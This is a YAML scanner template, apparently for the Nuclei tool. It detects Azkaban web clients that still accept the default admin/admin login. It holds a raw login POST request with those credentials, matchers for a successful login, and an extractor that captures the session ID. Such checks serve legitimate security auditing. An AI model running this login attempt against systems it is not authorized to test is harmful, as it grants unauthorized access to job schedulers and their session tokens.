id: azkaban-default-login
info:
  author: pussycat0x
  classification:
    cwe-id: CWE-798
  description: Azkaban is a batch workflow job scheduler created at LinkedIn to run
    Hadoop jobs.  Default web client credentials were discovered.
  name: Azkaban Web Client Default Credential
  reference:
  - https://www.shodan.io/search?query=http.title%3A%22Azkaban+Web+Client%22
  severity: high
  tags: default-login,azkaban
requests:
- attack: pitchfork
  extractors:
  - kval:
    - azkaban.browser.session.id
    type: kval
  matchers:
  - condition: and
    type: word
    words:
    - '"session.id"'
    - '"success"'
  - condition: and
    part: header
    type: word
    words:
    - azkaban.browser.session.id
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    password:
    - admin
    username:
    - admin
  raw:
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    action=login&username={{username}}&password={{password}}

    '
